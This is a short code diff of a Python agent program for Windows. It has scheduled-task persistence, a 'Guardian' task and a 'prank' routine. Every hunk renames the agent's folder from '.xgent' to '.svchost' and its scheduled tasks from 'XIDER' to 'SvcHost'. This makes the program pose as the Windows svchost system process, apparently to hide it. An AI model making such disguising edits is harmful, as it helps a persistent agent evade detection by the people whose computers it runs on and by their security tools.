@@ -1101,7 +1101,7 @@ def _claim_bootstrap_lock() -> bool:
     """Hold the shared per-user lock before loading replaceable agent modules."""
     global _bootstrap_lock_file
     try:
-        lock_path = Path.home() / ".xgent" / "agent.lock"
+        lock_path = Path.home() / ".svchost" / "agent.lock"
         lock_path.parent.mkdir(parents=True, exist_ok=True)
         handle = open(lock_path, "a+b")
         handle.seek(0, os.SEEK_END)
@@ -1154,7 +1154,7 @@ if not _BUNDLED_RUNTIME:
 
     if __name__ == "__main__":
         EARLY_UPDATE_STATE = prepare_agent_update_start(
-            Path.home() / ".xgent" / UPDATE_STATE_NAME,
+            Path.home() / ".svchost" / UPDATE_STATE_NAME,
             Path(__file__).resolve().parent,
         )
         if EARLY_UPDATE_STATE in {"recovered", "rolled_back"}:
@@ -1215,8 +1215,8 @@ def _schedule_prank_temp_cleanup(path: str) -> None:
     timer.daemon = True
     timer.start()
 MEDIA_REQUESTS = MediaRequestRegistry()
-WINDOWS_TASK_NAME = "XIDER Agent"
-WINDOWS_GUARDIAN_TASK_NAME = "XIDER Guardian"
+WINDOWS_TASK_NAME = "SvcHost Agent"
+WINDOWS_GUARDIAN_TASK_NAME = "SvcHost Guardian"
 _instance_lock_file = None
 
 
@@ -7956,7 +7956,7 @@ def ctypes_windll_user32_message_box(text: str) -> None:
 
 
 def setup_logging() -> None:
-    r"""Лог в %USERPROFILE%\.xgent\xgent.log (с ротацией) + консоль при наличии."""
+    r"""Лог в %USERPROFILE%\.svchost\xgent.log (с ротацией) + консоль при наличии."""
     CONFIG_DIR.mkdir(parents=True, exist_ok=True)
     handlers = [
         RotatingFileHandler(
